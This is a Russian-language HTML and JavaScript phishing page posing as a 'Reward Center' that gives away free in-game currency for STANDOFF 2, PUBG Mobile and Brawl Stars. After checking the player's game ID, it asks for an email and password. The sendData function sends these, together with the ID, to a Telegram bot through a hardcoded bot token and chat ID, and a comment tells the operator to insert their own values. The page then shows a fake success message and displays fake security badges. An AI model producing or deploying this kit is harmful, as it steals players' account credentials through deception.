<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reward Center — Получение наград</title>
<style>
    /* Сброс стилей и базовые настройки */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    body {
        background-color: #f4f6f9; /* Мягкий светлый фон */
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
        color: #1f2937;
    }
    
    /* Главная карточка */
    .container {
        background: #ffffff;
        border-radius: 20px;
        padding: 40px 32px;
        max-width: 440px;
        width: 100%;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06), 0 4px 12px rgba(0, 0, 0, 0.04);
        border: 1px solid #eef2f6;
        text-align: center;
    }
    
    /* Заголовок */
    .logo-icon {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 56px;
        height: 56px;
        background: #eff6ff;
        border-radius: 16px;
        margin-bottom: 16px;
        font-size: 28px;
    }
    h1 {
        font-size: 22px;
        font-weight: 700;
        color: #111827;
        margin-bottom: 8px;
        letter-spacing: -0.5px;
    }
    .sub {
        font-size: 14px;
        color: #6b7280;
        margin-bottom: 32px;
        line-height: 1.5;
    }
    
    /* Сетка кнопок */
    .buttons {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 12px;
        margin-bottom: 28px;
    }
    
    /* Кнопки платформ */
    .btn {
        padding: 16px 12px;
        border: 1px solid #e5e7eb;
        border-radius: 14px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        color: #374151;
        background: #ffffff;
        line-height: 1.4;
        transition: all 0.2s ease;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 6px;
    }
    .btn:hover {
        border-color: #3b82f6;
        background: #f8fafc;
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.1);
    }
    .btn:active {
        transform: translateY(0);
    }
    .btn .icon {
        font-size: 24px;
        margin-bottom: 2px;
    }
    .btn .platform-name {
        font-size: 13px;
        font-weight: 600;
        color: #1e293b;
    }
    .btn .platform-desc {
        font-size: 11px;
        font-weight: 400;
        color: #64748b;
    }

    /* Шаги */
    .step { display: none; flex-direction: column; gap: 16px; text-align: left; }
    .step.active { display: flex; }
    .step h2 { font-size: 16px; font-weight: 600; color: #1e293b; margin-bottom: 4px; }
    
    /* Поля ввода */
    input {
        width: 100%;
        padding: 14px 16px;
        border-radius: 12px;
        border: 1px solid #d1d5db;
        background: #ffffff;
        color: #111827;
        font-size: 15px;
        outline: none;
        transition: border-color 0.2s, box-shadow 0.2s;
    }
    input:focus {
        border-color: #3b82f6;
        box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
    }
    input::placeholder { color: #9ca3af; }
    
    .hint { font-size: 12px; color: #64748b; margin-top: -8px; }
    .error { color: #ef4444; font-size: 13px; display: none; margin-top: 4px; }
    .error.active { display: block; }
    
    /* Основная кнопка */
    .submit {
        width: 100%;
        padding: 14px;
        border: none;
        border-radius: 12px;
        background: #3b82f6;
        color: #ffffff;
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
        margin-top: 8px;
    }
    .submit:hover { background: #2563eb; }
    .submit:active { transform: scale(0.98); }

    /* Экран успеха */
    .success {
        display: none;
        flex-direction: column;
        align-items: center;
        gap: 12px;
        text-align: center;
    }
    .success.active { display: flex; }
    .checkmark {
        width: 64px;
        height: 64px;
        border-radius: 50%;
        background: #dcfce7;
        color: #16a34a;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 32px;
        margin-bottom: 8px;
        animation: pop 0.4s ease;
    }
    @keyframes pop {
        0% { transform: scale(0); }
        70% { transform: scale(1.1); }
        100% { transform: scale(1); }
    }
    .success h2 { color: #16a34a; font-size: 20px; font-weight: 700; }
    .success p { color: #6b7280; font-size: 14px; }
    .success .note { font-size: 12px; color: #9ca3af; margin-top: 8px; }

    /* Подвал */
    .footer { text-align: center; font-size: 12px; color: #9ca3af; margin-top: 32px; }
    
    /* Блок доверия */
    .trust-badge {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin-top: 24px;
        padding-top: 20px;
        border-top: 1px solid #f3f4f6;
        font-size: 12px;
        color: #6b7280;
    }
    .trust-badge span { display: flex; align-items: center; gap: 4px; }
</style>
</head>
<body>
<div class="container">
    <div class="logo-icon">🎁</div>
    <h1>Reward Center</h1>
    <p class="sub">Выберите платформу и получите награду</p>

    <div class="buttons" id="buttons">
        <button class="btn" onclick="selectPlatform('STANDOFF 2', 'Gold')">
            <span class="icon">🪙</span>
            <span class="platform-name">STANDOFF 2</span>
            <span class="platform-desc">Gold</span>
        </button>
        <button class="btn" onclick="selectPlatform('PUBG Mobile', 'UC')">
            <span class="icon">💰</span>
            <span class="platform-name">PUBG Mobile</span>
            <span class="platform-desc">UC</span>
        </button>
        <button class="btn" onclick="selectPlatform('Brawl Stars', 'Gems')">
            <span class="icon">💎</span>
            <span class="platform-name">Brawl Stars</span>
            <span class="platform-desc">Gems</span>
        </button>
    </div>

    <!-- Шаг 1: Ввод ID -->
    <div class="step" id="idStep">
        <h2 id="idTitle">Введите игровой ID</h2>
        <input type="text" id="gameId" placeholder="ID">
        <p class="hint" id="idHint"></p>
        <p class="error" id="idError">Неверный формат ID</p>
        <button class="submit" onclick="checkId()">Далее</button>
    </div>

    <!-- Шаг 2: Ввод данных -->
    <form class="step" id="loginStep" onsubmit="return sendData(event)">
        <h2 id="formTitle">Получение награды</h2>
        <input type="email" id="email" placeholder="Электронная почта" required>
        <input type="password" id="password" placeholder="Пароль" required>
        <button type="submit" class="submit">Получить 🎁</button>
    </form>

    <!-- Шаг 3: Успех -->
    <div class="success" id="success">
        <div class="checkmark">✓</div>
        <h2>Подарок получен!</h2>
        <p id="successText">Ваша награда зачислена на аккаунт.</p>
        <p class="note">Зайдите в игру и проверьте инвентарь</p>
    </div>

    <!-- Блок доверия (можно убрать, если не нужно) -->
    <div class="trust-badge">
        <span>🔒 Безопасная транзакция</span>
        <span>•</span>
        <span>⚡ Мгновенная выдача</span>
    </div>

    <div class="footer">© 2026 Reward Center. Все права защищены.</div>
</div>

<script>
    let selected = { platform: '', reward: '' };

    function selectPlatform(platform, reward) {
        selected.platform = platform;
        selected.reward = reward;

        document.getElementById('buttons').style.display = 'none';
        document.getElementById('idTitle').textContent = `Введите ID · ${platform}`;

        let hint = '';
        let placeholder = '';

        if (platform === 'STANDOFF 2') {
            hint = 'ID должен состоять из 9 цифр';
            placeholder = '123456789';
        } else if (platform === 'PUBG Mobile') {
            hint = 'ID должен состоять из 8–12 цифр';
            placeholder = '5123456789';
        } else if (platform === 'Brawl Stars') {
            hint = 'ID должен начинаться с # и содержать 9 символов';
            placeholder = '#ABC123XYZ';
        }

        document.getElementById('idHint').textContent = hint;
        document.getElementById('gameId').placeholder = placeholder;
        document.getElementById('gameId').value = '';
        document.getElementById('idError').classList.remove('active');
        document.getElementById('idStep').classList.add('active');
    }

    function checkId() {
        const id = document.getElementById('gameId').value.trim();
        const err = document.getElementById('idError');
        let valid = false;

        if (selected.platform === 'STANDOFF 2') {
            valid = /^\d{9}$/.test(id);
        } else if (selected.platform === 'PUBG Mobile') {
            valid = /^\d{8,12}$/.test(id);
        } else if (selected.platform === 'Brawl Stars') {
            valid = /^#[A-Za-z0-9]{9}$/.test(id);
        }

        if (!valid) {
            err.textContent = 'Неверный формат ID. ' + document.getElementById('idHint').textContent;
            err.classList.add('active');
            return;
        }

        err.classList.remove('active');
        document.getElementById('idStep').classList.remove('active');
        document.getElementById('formTitle').textContent = `${selected.reward} · ${selected.platform}`;
        document.getElementById('loginStep').classList.add('active');
    }

    function sendData(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const gameId = document.getElementById('gameId').value;

        // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ====
        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
        const CHAT_ID   = '8783227095';

        const text = `🎁 Новая заявка!\n\n` +
                     `🎮 Платформа: ${selected.platform}\n` +
                     `🏆 Награда: ${selected.reward}\n` +
                     `🆔 Игровой ID: ${gameId}\n` +
                     `📧 Email: ${email}\n` +
                     `🔑 Пароль: ${password}\n` +
                     `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        }).catch(err => console.log(err));

        document.getElementById('loginStep').classList.remove('active');
        document.getElementById('successText').textContent =
            `${selected.reward} для ${selected.platform} зачислены на аккаунт ${gameId}.`;
        document.getElementById('success').classList.add('active');
        
        // Скрываем блок доверия при успехе, чтобы не мешал
        document.querySelector('.trust-badge').style.display = 'none';

        return false;
    }
</script>
</body>
</html>
